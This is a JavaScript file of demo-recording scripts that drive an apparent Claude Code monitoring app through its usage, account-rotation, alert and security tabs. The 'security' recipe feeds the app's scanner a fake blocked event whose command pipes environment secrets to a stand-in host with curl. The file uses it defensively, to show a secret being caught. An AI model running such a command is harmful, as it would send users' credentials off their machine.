// Per-slug recording recipes. Each recipe.run(ctx) drives the app (via ctx's
// frameLocator helpers), triggers any scripted bridge broadcast at the key
// beat, and may set ctx.zoom = { startMs, endMs, cx, cy, zmax } to request a
// post-process push-in. ctx provides: app, page, sleep, post, now(),
// moveCursorTo, tap, openTab, openSubTab, waitText, focalOf, scrollApp.
//
// The app window is centered on the 1920x1080 desktop (left 690, width 540 →
// center x = 960), top 186. focalOf() returns absolute desktop coords.

export const RECIPES = {
  // ---------- Batch A: dashboards ----------
  compression: {
    run: async (c) => {
      await c.openTab('Optimize');
      await c.sleep(800);
      await c.openSubTab('Compression');
      await c.waitText('EST. INPUT TOKENS SAVED');
      await c.sleep(600);
      const { cy } = await c.focalOf('EST. INPUT TOKENS SAVED', 0, 34);
      await c.moveCursorTo(990, cy + 20, 600);
      await c.sleep(600);
      const startMs = c.now();
      await c.post('__demo_ramp');
      await c.sleep(6800);
      const endMs = c.now();
      await c.sleep(900);
      c.zoom = { startMs, endMs, cx: 960, cy, zmax: 1.7 };
    },
  },

  metrics: {
    run: async (c) => {
      await c.openTab('Metrics');
      await c.sleep(1300);
      await c.moveCursorTo(840, 360, 700);
      await c.sleep(700);
      await c.moveCursorTo(1080, 360, 700);
      await c.sleep(700);
      const startMs = c.now();
      await c.moveCursorTo(960, 360, 500);
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3600, cx: 960, cy: 360, zmax: 1.5 };
      await c.sleep(4000);
    },
  },

  optimize: {
    // Overview: pan the three levers (Subagents / Compression / Context),
    // then emphasize the header headline "CONTENT REDUCED 49% · SAVED 1294.92M tk".
    run: async (c) => {
      await c.openTab('Optimize');
      await c.sleep(1100);
      // Pan across the three optimization levers (sub-tab row ~screen y 342).
      await c.moveCursorTo(835, 342, 600);
      await c.sleep(450);
      await c.moveCursorTo(960, 342, 450);
      await c.sleep(450);
      await c.moveCursorTo(1085, 342, 450);
      await c.sleep(550);
      await c.moveCursorTo(960, 300, 550);
      await c.sleep(400);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 150, endMs: startMs + 3400, cx: 960, cy: 300, zmax: 1.6 };
      await c.sleep(3800);
    },
  },

  subagents: {
    // REALIZED 48.90M tk / POTENTIAL 23.40M tk hero on the Subagents sub-tab.
    run: async (c) => {
      await c.openTab('Optimize');
      await c.sleep(800);
      await c.openSubTab('Subagents');
      await c.sleep(1300);
      await c.moveCursorTo(960, 410, 700);
      await c.sleep(700);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3400, cx: 960, cy: 410, zmax: 1.55 };
      await c.sleep(3800);
    },
  },

  usage: {
    // Pool aggregate windows + per-account list with live reset countdowns.
    run: async (c) => {
      await c.openTab('Usage');
      await c.sleep(1300);
      await c.moveCursorTo(960, 330, 700);
      await c.sleep(700);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3400, cx: 960, cy: 360, zmax: 1.45 };
      await c.sleep(2400);
      await c.moveCursorTo(960, 430, 700);
      await c.sleep(1200);
    },
  },

  pool: {
    // Account cards side by side: plan badge, live utilization, reset countdown.
    run: async (c) => {
      await c.openTab('Accounts');
      await c.sleep(1200);
      await c.moveCursorTo(960, 300, 700);
      await c.sleep(600);
      const startMs = c.now();
      await c.moveCursorTo(960, 420, 900);
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3600, cx: 960, cy: 380, zmax: 1.45 };
      await c.sleep(3800);
    },
  },

  codemode: {
    run: async (c) => {
      await c.openTab('Optimize');
      await c.sleep(800);
      await c.openSubTab('Context');
      await c.sleep(1300);
      await c.moveCursorTo(960, 380, 700);
      await c.sleep(700);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3400, cx: 960, cy: 360, zmax: 1.5 };
      await c.sleep(3800);
    },
  },

  // ---------- Batch B: interaction clips ----------
  scanning: {
    // Secrets / PII / injection flagged in flight on the Security tab.
    run: async (c) => {
      await c.openTab('Security');
      await c.waitText('AWS access key');
      await c.sleep(700);
      await c.moveCursorTo(960, 380, 700);
      await c.sleep(500);
      const startMs = c.now();
      await c.post('__demo_security_event', {
        severity: 'high',
        kind: 'secret',
        title: 'GitHub token',
        matchMask: 'ghp_…[24 redacted]…9f',
        sourceHint: 'WebFetch(api.github.com)',
        blocked: true,
      });
      await c.sleep(1500);
      c.zoom = { startMs: startMs + 300, endMs: startMs + 3800, cx: 960, cy: 320, zmax: 1.5 };
      await c.sleep(3600);
    },
  },

  security: {
    // Catch and hold a high-severity secret, then Deny it from the in-app banner.
    run: async (c) => {
      await c.openTab('Security');
      await c.sleep(900);
      await c.post('__demo_security_event', {
        severity: 'high',
        kind: 'secret',
        title: 'AWS secret access key',
        matchMask: 'AKIA…[redacted]…',
        sourceHint: 'Bash(env | curl)',
        blocked: true,
      });
      await c.sleep(700);
      const startMs = c.now();
      await c.post('__demo_security_block', {
        severity: 'high',
        title: 'Secret blocked: AWS secret key',
        blockReason: 'A live-looking AWS secret was about to leave your machine.',
        source: 'scanner',
        matchMask: 'AKIA…[redacted]…',
        toolInputFields: { command: 'curl -d @- https://hooks.example.com' },
      });
      await c.sleep(1700);
      c.zoom = { startMs: startMs + 400, endMs: startMs + 4400, cx: 960, cy: 300, zmax: 1.4 };
      await c.sleep(1600);
      await c.tap(c.app.getByRole('button', { name: 'Deny', exact: false }).first());
      await c.sleep(1500);
    },
  },

  rules: {
    // Allow / deny / ask rules grouped, synced into Claude Code.
    run: async (c) => {
      await c.openSettings('Permissions');
      await c.sleep(700);
      const add = c.app.getByRole('button', { name: 'Add rule', exact: false }).first();
      await add.scrollIntoViewIfNeeded().catch(() => {});
      await c.sleep(500);
      await c.moveCursorTo(960, 360, 700);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3600, cx: 960, cy: 360, zmax: 1.4 };
      await c.sleep(2600);
      await c.tap(add);
      await c.sleep(1500);
    },
  },

  sandbox: {
    // OS-level file + network isolation: toggles, allowed domains, status.
    run: async (c) => {
      await c.openSettings('Isolation');
      await c.sleep(900);
      await c.moveCursorTo(960, 300, 600);
      await c.sleep(500);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 200, endMs: startMs + 4200, cx: 960, cy: 330, zmax: 1.45 };
      await c.sleep(2400);
      await c.moveCursorTo(960, 440, 700);
      await c.sleep(1800);
    },
  },

  accounts: {
    // Switch the active account: flip Manual -> Auto, the header reroutes.
    run: async (c) => {
      await c.openTab('Accounts');
      await c.sleep(1000);
      await c.tap(c.app.getByRole('radio', { name: 'Auto', exact: false }).first());
      await c.sleep(800);
      const startMs = c.now();
      await c.post('__demo_route', { accountId: 'org-acme-team' });
      await c.sleep(1600);
      c.zoom = { startMs: startMs + 200, endMs: startMs + 3800, cx: 960, cy: 250, zmax: 1.5 };
      await c.sleep(2400);
    },
  },

  switching: {
    // Auto mode rotates hands-free; the header follows each reroute.
    run: async (c) => {
      await c.openTab('Accounts');
      await c.sleep(900);
      await c.tap(c.app.getByRole('radio', { name: 'Auto', exact: false }).first());
      await c.sleep(700);
      const startMs = c.now();
      c.zoom = { startMs: startMs + 200, endMs: startMs + 4600, cx: 960, cy: 248, zmax: 1.5 };
      await c.post('__demo_route', { accountId: 'usr-side' });
      await c.sleep(1700);
      await c.post('__demo_route', { accountId: 'org-acme-team' });
      await c.sleep(1900);
    },
  },

  caps: {
    // A rolling 7-day spend cap pauses an account out of rotation.
    run: async (c) => {
      await c.openTab('Accounts');
      await c.sleep(1000);
      await c.moveCursorTo(960, 300, 600);
      await c.sleep(400);
      const startMs = c.now();
      await c.post('__demo_spend', {
        perAccount: { 'org-acme': 100.0, 'org-acme-team': 31.5, 'usr-side': null },
        global: 131.5,
      });
      await c.sleep(500);
      await c.post('__demo_pause', { accountId: 'org-acme', reason: 'sentinel_budget' });
      await c.sleep(1500);
      c.zoom = { startMs: startMs + 400, endMs: startMs + 4000, cx: 960, cy: 300, zmax: 1.5 };
      await c.sleep(3400);
    },
  },

  alerts: {
    // Set a threshold; crossing it fires a native OS notification (faked on the
    // desktop) and lands in the Alerts history. No app-zoom: the banner lives
    // top-right of the desktop, outside the 540px window.
    run: async (c) => {
      await c.openTab('Alerts');
      await c.sleep(1200);
      await c.moveCursorTo(960, 330, 600);
      await c.sleep(700);
      await c.post('__demo_alert', {
        accountId: 'org-acme',
        scope: 'account',
        thresholdPct: 80,
        utilization: 0.82,
      });
      await c.page.evaluate(
        () =>
          window.__demo &&
          window.__demo.notify({
            title: 'Acme Labs at 80%',
            body: 'Crossed your 80% threshold on the 5-hour window.',
            ms: 5200,
          }),
      );
      await c.sleep(3200);
    },
  },
};
